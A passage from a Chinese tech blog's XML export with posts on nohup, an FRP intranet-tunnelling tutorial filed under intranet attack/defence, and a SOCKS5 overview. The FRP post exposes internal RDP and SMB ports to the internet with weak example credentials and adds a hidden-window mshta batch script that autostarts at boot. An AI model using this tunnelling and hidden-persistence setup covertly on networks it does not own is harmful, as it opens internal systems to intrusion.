some-command <span class="token operator">&gt;</span> output.log <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li></ol><p>​        这里 <code>&gt;</code> 将标准输出重定向到 <code>output.log</code>，<code>2&gt;&amp;1</code> 将标准错误也重定向到同一个文件。</p><ol start="5"><li><p><strong>退出代码</strong>：</p><ul><li><code>nohup</code> 命令本身会返回 <code>0</code>，表示成功执行。它不会返回后台运行命令的退出代码。</li></ul></li><li><p><strong>查看后台进程</strong>：</p><ul><li>你可以使用 <code>ps</code> 命令查看后台运行的 <code>nohup</code> 进程，或者使用 <code>jobs</code> 查看当前会话的后台作业。</li></ul></li><li><p><strong>结束后台进程</strong>：</p><ul><li>如果需要结束 <code>nohup</code> 启动的后台进程，可以使用 <code>kill</code> 命令加上进程的 PID（进程编号）。</li></ul></li></ol><h2 id="1-3-使用示例"><a href="#1-3-使用示例" class="headerlink" title="1.3 使用示例"></a>1.3 使用示例</h2><p>在一个需要长时间（24小时以上）运行python脚本的场景中，一开始通过MobaXTerm连接远程主机获取ssh的shell，然后直接在终端运行 <code>/路径/python xxxx.py</code>，第二天查看日志的时候，脚本莫名其妙终止了。怀疑可能是堡垒机回收或者shell断开连接导致的。</p><p>为了测试是否是上述原因，并解决因为shell断连导致脚本运行结束的问题，使用nohup后台运行python任务进程。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nohup</span> xxxxx/python xxxxx.py <span class="token operator">&gt;</span> myTest.log <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ul><li>命令详解：</li></ul><ol><li>**<code>nohup</code>**：这是命令的开始，表示忽略挂起信号，即使用户注销或终端关闭，命令也会继续运行。</li><li>**<code>xxxxx/python</code>**：这部分应该是要执行的 Python 解释器的路径。请确保替换 <code>xxxxx</code> 为实际的路径，例如 <code>/usr/bin/python</code>。</li><li>**<code>xxxxx.py</code>**：这是要运行的 Python 脚本的路径。同样，请确保替换 <code>xxxxx</code> 为实际的脚本路径，例如 <code>/home/user/myscript.py</code>。</li><li>**<code>&gt;</code>**：这是一个输出重定向操作符，它会将标准输出（stdout）重定向到后面指定的文件。</li><li>**<code>myTest.log</code>**：这是希望将标准输出重定向到的文件名。如果该文件不存在，<code>nohup</code> 会创建它；如果文件已存在，输出会覆盖到myTest.log文件。</li><li>**<code>2&gt;&amp;1</code>**：这是一个错误输出重定向操作符，它将标准错误（stderr）重定向到标准输出（stdout）。这意味着错误信息也会被写入到 <code>myTest.log</code> 文件中。</li><li>**<code>&amp;</code>**：这是一个后台运行操作符，它将命令放在后台执行，允许您继续在同一终端进行其他操作。</li></ol><p>综上所述，这个命令的意思是：使用 <code>nohup</code> 运行指定路径的 Python 解释器来执行指定路径的 Python 脚本，并将标准输出和标准错误都重定向到 <code>myTest.log</code> 文件中，同时让这个命令在后台运行。</p><ul><li>2&gt;&amp;1详解：</li></ul><p><code>2&gt;&amp;1</code> 是一个在 Unix 和类 Unix 系统中常用的 shell 操作符，用于将标准错误（stderr，文件描述符为 2）重定向到标准输出（stdout，文件描述符为 1）的位置。下面是对 <code>2&gt;&amp;1</code> 的详细解释：</p><ol><li>**<code>2</code>**：这个数字代表标准错误输出（stderr）的文件描述符。在 Unix 系统中，每个打开的文件都有一个与之关联的文件描述符，而标准错误输出默认的文件描述符是 2。</li><li>**<code>&gt;</code>**：这是一个重定向操作符，用于将紧随其后的文件描述符的输出重定向到指定的位置。</li><li><strong><code>&amp;1</code><strong>： <code>1</code> 是标准输出（stdout）的文件描述符。<code>&amp;1</code> 表示将前面的文件描述符（这里是标准错误 stderr）重定向到标准输出的位置。「这里的</strong>&amp;<strong>没有固定的意思放在</strong>&gt;<strong>后面的</strong>&amp;<strong>，表示重定向的目标不是一个</strong>文件</strong>，而是一个<strong>文件描述符</strong></li></ol><p>综合起来，<code>2&gt;&amp;1</code> 的作用是将标准错误输出重定向到标准输出的位置。这意味着，原本应该输出到 stderr 的内容（通常是错误信息）现在会和 stdout 的内容一起输出。</p></blockquote><p><code>nohup</code> 是一个非常有用的工具，特别是在需要长时间运行的命令或者需要在服务器上执行长时间任务时。通过使用 <code>nohup</code>，你可以确保即使在远程会话断开后，任务仍然可以继续执行。</p>]]></content>
      
      
      <categories>
          
          <category> 系统运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 系统运维 </tag>
            
            <tag> 后台进程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FRP内网穿透</title>
      <link href="/2024/12/13/nei-wang-gong-fang/frp-nei-wang-chuan-tou/"/>
      <url>/2024/12/13/nei-wang-gong-fang/frp-nei-wang-chuan-tou/</url>
      
        <content type="html"><![CDATA[<h1 id="一、什么是FRP"><a href="#一、什么是FRP" class="headerlink" title="一、什么是FRP"></a>一、什么是FRP</h1><h2 id="1-1-FRP简介"><a href="#1-1-FRP简介" class="headerlink" title="1.1 FRP简介"></a>1.1 FRP简介</h2><p>FRP（Fast Reverse Proxy）是一个开源、高性能的内网穿透和反向代理应用，它支持TCP、UDP、HTTP、HTTPS等多种协议。FRP可以帮助用户将内网服务以安全、便捷的方式通过具有公网IP节点的中转暴露到公网。</p><p>FRP由客户端（frpc）和服务端（frps）组成，服务端通常部署在具有公网IP的机器上，而客户端部署在需要穿透的内网服务所在的机器上。通过这种方式，FRP实现了内网服务的公网访问，同时提供了安全性和便利性。</p><p>FRP的一些应用场景：</p><ul><li><strong>远程访问内网服务</strong>：例如，通过FRP访问家里或公司的服务器，而不需要配置复杂的端口映射。</li><li><strong>开发环境共享</strong>：开发者可以通过FRP共享自己本地的开发环境，外部团队可以直接访问内网的应用和API。</li><li><strong>穿透防火墙/NAT</strong>：即使内网服务器处于NAT后面或防火墙后面，仍然可以通过FRP将服务暴露到公网。</li></ul><h2 id="1-2-FRP工作原理"><a href="#1-2-FRP工作原理" class="headerlink" title="1.2 FRP工作原理"></a>1.2 FRP工作原理</h2><img src="/2024/12/13/nei-wang-gong-fang/frp-nei-wang-chuan-tou/%E6%88%AA%E5%B1%8F2024-12-16%2010.09.24.png" style="zoom:50%;"><ul><li>服务端（frps）运行，监听一个主端口，等待客户端（frpc）的连接；</li><li>客户端（frpc）连接到服务端（frps）的主端口，同时告诉服务端要监听的端口和转发类型；</li><li>服务端fork新的进程监听客户端指定的监听端口；</li><li>外网用户连接到上一步服务端fork的进程所监听的端口，服务端（frps）通过和客户端（frpc）的连接将数据转发到客户端（frpc）；</li><li>客户端（frpc）进程再将数据转发到本地服务</li><li>后续流量从内网本地服务转发给frpc，frpc转发给frps，frps转发给外网用户，从而实现内网对外暴露服务的能力。</li></ul><img src="/2024/12/13/nei-wang-gong-fang/frp-nei-wang-chuan-tou/%E6%88%AA%E5%B1%8F2024-12-16%2010.14.00.png" style="zoom:50%;"><blockquote><p>图中，内网本地的127.0.0.1:80端口的web服务通过客户端配置，映射到VPS上的47.97.177.130:30001端口。后续流量从本地80端口转发到frpc，frpc通过vps的7000端口转发给vps，vps在把流量转发到30001端口，如此便实现了内网服务在外网的暴露，外网用户可以从外网访问到内网的80端口的服务。</p></blockquote><h1 id="二、实现FRP内网穿透的前提条件"><a href="#二、实现FRP内网穿透的前提条件" class="headerlink" title="二、实现FRP内网穿透的前提条件"></a>二、实现FRP内网穿透的前提条件</h1><ol><li>VPS一台（也可以是具有公网IP的实体机），因为frp的原理是利用服务端VPS来进行流量转发，因而VPS的性能直接决定了后续连接的质量。</li><li>访问目标设备（就是你最终要访问的内网设备）</li><li>简单的Linux命令基础</li></ol><h1 id="三、实现方法"><a href="#三、实现方法" class="headerlink" title="三、实现方法"></a>三、实现方法</h1><h2 id="3-1-服务端（frps）"><a href="#3-1-服务端（frps）" class="headerlink" title="3.1 服务端（frps）"></a>3.1 服务端（frps）</h2><p>1）通过SSH与VPS建立连接，然后执行<code>arch</code>命令查看硬件架构的类型。</p><blockquote><p><code>arch</code>命令是一个用于显示当前主机的硬件架构类型的Linux命令。这个命令在多个Linux发行版中都是可用的，包括RedHat、RHEL、Ubuntu、CentOS等。通过使用<code>arch</code>命令，你可以快速地获取当前系统的硬件架构信息，这对于跨平台编程、软件包管理和系统故障排除等场景非常有用。</p></blockquote><p>2）根据架构不同，选择相应版本并进行下载。</p><p>如果是x86_64即可选择amd64</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://github.com/fatedier/frp/releases/download/v0.22.0/frp_0.22.0_linux_amd64.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>x86_64 和 amd64：</p><p><code>x86_64</code>和<code>amd64</code>都是指64位的x86架构，它们是同一种架构的不同名称。</p><ol><li><strong>x86_64</strong>：<ul><li>这个术语是英特尔（Intel）的64位扩展架构的官方名称。</li><li>x86_64是x86架构的64位扩展，x86是英特尔最初为其8086处理器定义的32位架构。</li><li>x86_64架构支持64位内存寻址，允许操作系统和应用程序访问超过4GB的内存。</li></ul></li><li><strong>amd64</strong>：<ul><li><code>amd64</code>是AMD为其64位处理器架构所使用的名称。</li><li>实际上，<code>amd64</code>与<code>x86_64</code>是兼容的，因为AMD的64位处理器也是基于x86架构设计的。</li><li><code>amd64</code>同样支持64位计算和更大的内存寻址空间。</li></ul></li></ol><p>尽管名称不同，但这两个术语都指的是同一种64位计算架构。在大多数情况下，它们可以互换使用，因为它们在技术上是等效的。这种架构被广泛应用于个人电脑、服务器和工作站中，因为它提供了更好的性能和更大的内存寻址能力。</p><p>所以在这里，arch返回的架构如果是x86_64，那么下载frp的时候可以选择amd64的安装包。</p></blockquote><p>3）解压查看文件内容</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> frp_0.22.0_linux_amd64.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>文件夹改个名，方便使用</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mv</span> frp_0.22.0_linux_amd64 frp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看文件夹内容：</p><ul><li>frps</li><li>frps.ini</li><li>frpc</li><li>frpc.ini</li></ul><p>其中frps和frps.ini是frp的服务端程序及配置文件，frpc和frpc.ini是frp的客户端程序及配置文件。首先在VPS配置服务端程序，客户端程序相关的文件可以删除。</p><p>4）frps.ini</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>common<span class="token punctuation">]</span>bind_port <span class="token operator">=</span> <span class="token number">7000</span>dashboard_port <span class="token operator">=</span> <span class="token number">7500</span>token <span class="token operator">=</span> <span class="token number">12345678</span>dashboard_user <span class="token operator">=</span> admindashboard_pwd <span class="token operator">=</span> adminvhost_http_port <span class="token operator">=</span> <span class="token number">10080</span>vhost_https_port <span class="token operator">=</span> <span class="token number">10443</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ol><li><code>bind_port = 7000</code>：这是<code>frp</code>服务端监听的端口，用于接收来自客户端的连接。默认情况下，客户端会将流量发送到这个端口。</li><li><code>dashboard_port = 7500</code>：这是<code>frp</code>的仪表板（Dashboard）端口，用于访问<code>frp</code>的Web管理界面。通过这个端口，你可以查看连接状态、流量统计等信息。</li><li><code>token = 12345678</code>：这是用于客户端和服务端之间认证的令牌。客户端在连接到服务端时需要提供这个令牌，以确保连接的安全性。</li><li><code>dashboard_user = admin</code>：这是访问仪表板时使用的用户名。</li><li><code>dashboard_pwd = admin</code>：这是访问仪表板时使用的密码。</li><li><code>vhost_http_port = 10080</code>：这是用于虚拟主机的HTTP端口。如果你配置了<code>frp</code>的虚拟主机功能，那么通过这个端口可以访问绑定的域名。</li><li><code>vhost_https_port = 10443</code>：这是用于虚拟主机的HTTPS端口。与<code>vhost_http_port</code>类似，但是用于加密的HTTPS流量。</li></ol></blockquote><p>5）启动frps</p><pre class="line-numbers language-BASH" data-language="BASH"><code class="language-BASH">./frps -c frps.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果看到屏幕输出这样一段内容，即表示运行正常，如果出现错误提示，请检查上面的步骤。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>service.go:130<span class="token punctuation">]</span> frps tcp listen on <span class="token number">0.0</span>.0.0:7000<span class="token punctuation">[</span>service.go:172<span class="token punctuation">]</span> http <span class="token function">service</span> listen on <span class="token number">0.0</span>.0.0:10080<span class="token punctuation">[</span>service.go:193<span class="token punctuation">]</span> https <span class="token function">service</span> listen on <span class="token number">0.0</span>.0.0:10443<span class="token punctuation">[</span>service.go:216<span class="token punctuation">]</span> Dashboard listen on <span class="token number">0.0</span>.0.0:7500<span class="token punctuation">[</span>root.go:210<span class="token punctuation">]</span> Start frps success<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时访问vpsip:7500 并使用自己设置的用户名密码登录，即可看到仪表板界面。</p><img src="/2024/12/13/nei-wang-gong-fang/frp-nei-wang-chuan-tou/%E6%88%AA%E5%B1%8F2024-12-16%2009.46.04.png" style="zoom:50%;"><p>6）服务端后台运行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nohup</span> ./frps <span class="token parameter variable">-c</span> frps.ini <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ul><li><code>nohup</code>：nohup是一个后台程序管理工具，用于运行命令并其在你退出终端会话后仍然继续运行。<code>nohup</code>的名称来源于“no hang up”（不要挂断）。</li><li><code>./frps</code>：这是<code>frp</code>服务端程序的可执行文件。<code>.</code>/<code>表示当前目录，</code>frps`是要执行的程序。</li><li><code>-c frps.ini</code>：这是传递给<code>frps</code>程序的一个参数，指定使用<code>frps.ini</code>文件作为配置文件。</li><li><code>&amp;</code>：这个符号将命令放到后台执行，即使终端关闭，程序也会继续运行。</li></ul><p>当你执行这个命令时，<code>frps</code>服务会使用<code>frps.ini</code>配置文件中的设置启动，并在后台运行，不会占用终端。这样，你可以继续使用终端进行其他操作，而<code>frps</code>服务会在后台保持运行状态。</p><p>如果你需要查看<code>frps</code>服务的输出，可以使用<code>nohup</code>命令的输出重定向功能，例如：</p><p>nohup ./frps -c frps.ini &gt; frps.log 2&gt;&amp;1 &amp;</p><p>这个命令会将<code>frps</code>的标准输出（<code>stdout</code>）和标准错误（<code>stderr</code>）都重定向到<code>frps.log</code>文件中，这样你就可以通过查看<code>frps.log</code>文件来获取服务的日志信息。</p></blockquote><p>输出如下内容即表示正常运行：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nohup: ignoring input and appending output to <span class="token string">'nohup.out'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时可先使用Ctrl+C关闭nohup，frps依然会在后台运行，使用jobs命令查看后台运行的程序<code>jobs</code>，在结果中我们可以看到frps正在后台正常运行</p><pre class="line-numbers language-none"><code class="language-none">[1]+  Running                 nohup ./frps -c frps.ini &amp;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时访问 vpsip:7500 依然可以打开仪表板界面，至此，服务端即设置完成，可以关闭SSH窗口。</p><h2 id="3-2-客户端（frpc）"><a href="#3-2-客户端（frpc）" class="headerlink" title="3.2 客户端（frpc）"></a>3.2 客户端（frpc）</h2><p>frp客户端部署在我们真正想访问的内网设备。</p><p>1）根据内网设备类型下载相应的frp程序</p><p>2）frpc.ini配置文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>common<span class="token punctuation">]</span>server_addr <span class="token operator">=</span> 【填vps的ip<span class="token operator">==</span>frps的ip】server_port <span class="token operator">=</span> <span class="token number">7000</span>token <span class="token operator">=</span> won517574356<span class="token punctuation">[</span>rdp<span class="token punctuation">]</span><span class="token builtin class-name">type</span> <span class="token operator">=</span> tcplocal_ip <span class="token operator">=</span> <span class="token number">127.0</span>.0.1           local_port <span class="token operator">=</span> <span class="token number">3389</span>remote_port <span class="token operator">=</span> <span class="token number">7001</span>  <span class="token punctuation">[</span>smb<span class="token punctuation">]</span><span class="token builtin class-name">type</span> <span class="token operator">=</span> tcplocal_ip <span class="token operator">=</span> <span class="token number">127.0</span>.0.1local_port <span class="token operator">=</span> <span class="token number">445</span>remote_port <span class="token operator">=</span> <span class="token number">7002</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这是 <code>frp</code> 客户端的配置文件，用于定义客户端如何连接到服务端以及如何转发特定的端口。下面是各配置项的详细解释：</p><p>[common] 部分：</p><ul><li><code>server_addr</code>：服务端的IP地址，这里需要填写你的VPS（虚拟专用服务器）的IP地址，也就是运行 <code>frps</code> 的服务器的IP。</li><li><code>server_port</code>：服务端监听的端口，这里设置为7000，与服务端配置文件中的 <code>bind_port</code> 相对应。</li><li><code>token</code>：用于客户端和服务端之间认证的令牌，这里设置为 <code>won517574356</code>，需要与服务端配置文件中的 <code>token</code> 一致。</li></ul><p>[rdp] 部分：</p><ul><li><code>type</code>：代理类型，这里设置为 <code>tcp</code>，表示使用TCP协议。</li><li><code>local_ip</code>：内网中需要被代理的机器的IP地址，这里设置为 <code>127.0.0.1</code>，通常用于本地机器。</li><li><code>local_port</code>：内网中需要被代理的机器的端口，这里设置为3389，是Windows远程桌面（RDP）的标准端口。</li><li><code>remote_port</code>：在服务端上开放的端口，用于外部访问，这里设置为7001。</li></ul><p>[smb] 部分：</p><ul><li><code>type</code>：代理类型，这里同样设置为 <code>tcp</code>。</li><li><code>local_ip</code>：内网中需要被代理的机器的IP地址，这里也是 <code>127.0.0.1</code>。</li><li><code>local_port</code>：内网中需要被代理的机器的端口，这里设置为445，是Windows文件共享（SMB）的标准端口。</li><li><code>remote_port</code>：在服务端上开放的端口，用于外部访问，这里设置为7002。</li></ul></blockquote><p>通过这个配置文件，你可以将内网中的RDP和SMB服务暴露给公网，使得你可以从外部通过VPS的IP地址和相应的 <code>remote_port</code> 来访问这些服务。例如，你可以通过 <code>server_addr:7001</code> 来访问RDP服务，通过 <code>server_addr:7002</code> 来访问SMB服务。</p><p>3）运行客户端程序</p><blockquote><p>frpc程序不能直接双击运行！</p></blockquote><p>找到程序安装位置：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./frpc <span class="token parameter variable">-c</span> frpc.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>service.go:205<span class="token punctuation">]</span> login to server success, get run <span class="token function">id</span> <span class="token punctuation">[</span>2b65b4e58a5917ac<span class="token punctuation">]</span>, server udp port <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>proxy_manager.go:136<span class="token punctuation">]</span> <span class="token punctuation">[</span>2b65b4e58a5917ac<span class="token punctuation">]</span> proxy added: <span class="token punctuation">[</span>rdp smb<span class="token punctuation">]</span><span class="token punctuation">[</span>control.go:143<span class="token punctuation">]</span> <span class="token punctuation">[</span>smb<span class="token punctuation">]</span> start proxy success<span class="token punctuation">[</span>control.go:143<span class="token punctuation">]</span> <span class="token punctuation">[</span>rdp<span class="token punctuation">]</span> start proxy success<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>运行frpc程序，窗口中输出如上内容表示运行正常。</p><p>不关闭命令行窗口，此时可以在局域网外使用相应程序访问 vpsip:remote_port （端口为自定义的remote_port）即可访问到相应服务。</p><p>4）客户端后台运行及开机自启</p><p>创建fprc.bat文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">@echo off<span class="token keyword">if</span> <span class="token string">"%1"</span> <span class="token operator">==</span> <span class="token string">"h"</span> goto beginmshta vbscript:createobject<span class="token punctuation">(</span><span class="token string">"wscript.shell"</span><span class="token punctuation">)</span>.run<span class="token punctuation">(</span><span class="token string">""</span>"%~nx0<span class="token string">""</span> h",0<span class="token punctuation">)</span><span class="token punctuation">(</span>window.close<span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token builtin class-name">exit</span>:beginREM<span class="token builtin class-name">cd</span> C:<span class="token punctuation">\</span>frpfrpc <span class="token parameter variable">-c</span> frpc.ini<span class="token builtin class-name">exit</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这段代码是一个Windows批处理脚本（<code>.bat</code> 文件），用于以隐藏窗口的方式运行 <code>frp</code> 客户端程序 <code>frpc</code>。下面是脚本的详细解释：</p><ol><li><code>@echo off</code>：关闭命令的回显，使得执行时不会显示执行的命令。</li><li><code>if "%1" == "h" goto begin</code>：检查传递给批处理脚本的第一个参数（<code>%1</code>），如果参数是 <code>h</code>，则跳转到标签 <code>begin</code>。</li><li><code>mshta vbscript:createobject("wscript.shell").run("""%~nx0"" h",0)(window.close)&amp;&amp;exit</code>：如果第一个参数不是 <code>h</code>，则使用 <code>mshta</code> 命令（Microsoft HTML Application）执行一个VBScript脚本来运行当前脚本，并传递 <code>h</code> 作为参数，同时关闭 <code>mshta</code> 窗口。<code>%~nx0</code> 是当前批处理文件的名称和扩展名。</li><li><code>:begin</code>：一个标签，用于在条件满足时跳转到这里。</li><li><code>cd C:\frp</code>：将命令行的当前目录更改为 <code>C:\frp</code>，假设 <code>frpc.ini</code> 配置文件和 <code>frpc</code> 可执行文件位于这个目录。</li><li><code>frpc -c frpc.ini</code>：运行 <code>frpc</code> 客户端程序，并使用 <code>frpc.ini</code> 配置文件。</li><li><code>exit</code>：退出批处理脚本。</li></ol><p>这个脚本的目的是让用户可以通过双击批处理文件来以隐藏窗口的方式启动 <code>frpc</code> 客户端，而不需要打开命令行窗口。如果用户希望在命令行中启动 <code>frpc</code> 并看到输出，他们可以传递 <code>h</code> 作为参数，例如 <code>your_script.bat h</code>，这样就不会使用 <code>mshta</code> 来隐藏窗口。</p><p>请注意，使用 <code>mshta</code> 来隐藏窗口是一种不太常见的做法，可能会被一些安全软件视为可疑行为。此外，<code>mshta</code> 命令在某些Windows版本中可能已被禁用。</p></blockquote><p>之后直接运行这个 .bat 文件即可启动frpc并隐藏窗口（可在任务管理器中退出）。</p><p>如果想要开机启动，把这个 .bat 文件放在Windows的开机启动文件夹即可。</p><p>之后如果想暴露其他服务，只需要需要在frpc.ini后追加规则即可。</p><blockquote><p> 建议在使用frp直接测试内网穿透前，先在局域网内测试好相关功能的正常使用，并配置好可能会影响的Windows防火墙等内容，在内网调试通过后再使用frp进行内网穿透测试。</p></blockquote><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><p><a href="https://juejin.cn/post/7042486792011907086">https://juejin.cn/post/7042486792011907086</a></p></li><li><p><a href="https://blog.csdn.net/weixin_44801963/article/details/121104146">https://blog.csdn.net/weixin_44801963/article/details/121104146</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 内网攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网攻防 </tag>
            
            <tag> FRP </tag>
            
            <tag> FRP内网穿透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SOCKS5代理协议</title>
      <link href="/2024/12/13/nei-wang-gong-fang/socks5-dai-li-xie-yi/"/>
      <url>/2024/12/13/nei-wang-gong-fang/socks5-dai-li-xie-yi/</url>
      
        <content type="html"><![CDATA[<h1 id="一、SOCKS5协议简介"><a href="#一、SOCKS5协议简介" class="headerlink" title="一、SOCKS5协议简介"></a>一、SOCKS5协议简介</h1><p>SOCKS5（Socket secure 5）协议是一种网络代理协议，它在客户端和服务器之间扮演中介角色，它允许客户端通过代理服务器与目标服务器进行通信，隐藏客户端的真实IP地址和身份信息。SOCKS5代理是一种传输层代理，工作在网络协议栈中的传输层，可以支持多种网络协议（如TCP和UDP）的代理。根据OSI七层模型来划分，SOCKS属于会话层协议，位于表示层与传输层之间。</p><p>通过 SOCKS5 代理，客户端可以在不直接与目标服务器通信的情况下，通过代理服务器来访问网络资源。这种代理方式对于保护客户端的隐私和实现网络匿名性非常有用，同时还可以绕过防火墙和地理限制。</p><ul><li>SOCKS5是SOCKS协议的第五个版本，作为socks4的一个延伸，在socks4的基础上新增<strong>UDP转发</strong>和<strong>认证功能</strong>。唯一遗憾的是socks5并不兼容socks4协议。socks5由IETF在1996年正式发布，经过这么多年的发展，互联网上基本上都以socks5为主，socks4已经退出了历史的舞台。</li><li>SOCKS5支持IPv4和IPv6地址，适应不同网络环境的需求。</li></ul><p>socks5的RFC地址：</p><ul><li><p>rfc1928：<a href="https://www.ietf.org/rfc/rfc1928.txt">https://www.ietf.org/rfc/rfc1928.txt</a></p></li><li><p>rfc1929：<a href="https://www.ietf.org/rfc/rfc1929.txt">https://www.ietf.org/rfc/rfc1929.txt</a></p><blockquote><p>对于广大的中国网友来说，一提到代理，肯定会想到翻墙，而socks5作为一种代理协议，肯定也能用来翻墙嘛。不过遗憾的是，虽然它是代理协议，然而并不能用于翻墙。因为它的数据都是明文传输，会被墙轻易阻断。</p><p>socks协议历史悠久，它面世时中国的互联网尚未成型，更别说墙，因此它并不是为翻墙而设计的协议。互联网早期，企业内部网络为了保证安全性，都是置于防火墙之后，这样带来的副作用就是访问内部资源会变得很麻烦，socks协议就是为了解决这个问题而诞生的。</p><p>socks相当于在防火墙撕了一道口子，让合法的用户可以通过这个口子连接到内部，从而访问内部的一些资源和进行管理。</p></blockquote></li></ul><h1 id="二、通信流程"><a href="#二、通信流程" class="headerlink" title="二、通信流程"></a>二、通信流程</h1><img src="/2024/12/13/nei-wang-gong-fang/socks5-dai-li-xie-yi/%E6%88%AA%E5%B1%8F2024-12-13%2015.43.58.png" style="zoom:50%;"><ul><li>客户端首先与SOCKS5服务器建立TCP连接。</li><li>接着进行身份验证，客户端和服务器协商支持的认证方式。</li><li>客户端发送连接请求，包括要访问的服务器域名或IP以及端口信息。</li><li>SOCKS5服务器收到请求后，向目标服务器建立TCP连接，并将请求转发给目标服务器。</li><li>目标服务器的响应通过SOCKS5服务器转发回客户端。</li></ul><h1 id="三、应用场景"><a href="#三、应用场景" class="headerlink" title="三、应用场景"></a>三、应用场景</h1><ul><li><strong>隐私保护与匿名上网</strong>：SOCKS5代理可以隐藏用户的真实IP地址，帮助用户在网络上保持匿名，避免网络追踪和地理限制。</li><li><strong>绕过网络限制</strong>：SOCKS5代理能够帮助用户绕过地方性或网络服务提供商设置的访问限制，例如在审查严格的环境下访问互联网内容。</li><li><strong>远程连接到本地网络</strong>：SOCKS5代理在远程工作场景中具有重要应用，远程工作人员可以使用SOCKS5代理连接到公司内部网络，安全地访问公司资源。</li><li><strong>数据抓取和网络爬虫</strong>：对于从事数据抓取和网络爬虫工作的用户，SOCKS5代理具有出色的性能优势，能够绕过网站的反爬虫机制。</li></ul><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a href="https://wiyi.org/socks5-protocol-in-deep.html">https://wiyi.org/socks5-protocol-in-deep.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网攻防 </tag>
            
            <tag> SOCKS5 </tag>
            
            <tag> 代理协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>centos虚拟机安装及问题解决</title>
      <link href="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/"/>
      <url>/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/</url>
      
        <content type="html"><![CDATA[<h1 id="一、-centos6-9"><a href="#一、-centos6-9" class="headerlink" title="一、 centos6.9"></a>一、 centos6.9</h1><p>这篇文章的背景是我想在centos上安装docker进行学习和练习，之前安装过一台centos6.9，是带UI界面的，尝试安装docker的过程中碰到了一些问题。这里以它为例子来演示一些相关问题的解决（都是实际踩过的一些坑，最后新装了一台最小化安装的centos7，不过解决问题的思路大体相似）。</p><h2 id="1-1-网络不通问题排查解决（后面有复盘分析）"><a href="#1-1-网络不通问题排查解决（后面有复盘分析）" class="headerlink" title="1.1 网络不通问题排查解决（后面有复盘分析）"></a>1.1 网络不通问题排查解决（后面有复盘分析）</h2><p>虚拟机：centos6.9、NAT模式，目标联通互联网。</p><blockquote><ul><li>网络不通问题排查解决：（后面有复盘分析）</li></ul><p>centos虚拟机NAT模式，eth0的ip为192.168.155.254，宿主机ip192.168.155.1（且无法ping通。）</p><p>运行dhclient后成功ping通宿主机。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.02.37.png" style="zoom:40%;"><p>但还是无法ping通互联网。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.03.19.png" style="zoom:35%;"><p>编辑网络配置文件<code>/etc/sysconfig/network-scripts/ifcfg-eth0</code>（根据实际网卡名称修改）</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.05.59.png" 